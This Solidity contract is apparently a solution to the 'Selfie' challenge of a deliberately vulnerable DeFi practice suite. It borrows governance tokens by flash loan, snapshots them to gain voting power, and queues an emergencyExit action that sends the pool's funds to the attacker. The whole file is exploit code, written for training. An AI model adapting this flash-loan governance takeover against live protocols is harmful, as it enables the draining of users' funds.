// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttack is IERC3156FlashBorrower{

    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    address public immutable attacker;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool) {
        attacker = msg.sender;
        pool = SelfiePool(_pool);
        governance = pool.governance();
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        bytes memory data = abi.encodeCall(pool.emergencyExit, attacker);
        DamnValuableTokenSnapshot(token).snapshot();
        governance.queueAction(address(pool), 0, data);
        ERC20(token).approve(address(pool), amount + fee);
        return CALLBACK_SUCCESS;
    }

    function executeFlashLoan(uint256 amount) external {
        pool.flashLoan(this, address(pool.token()), amount, bytes(""));
    }
}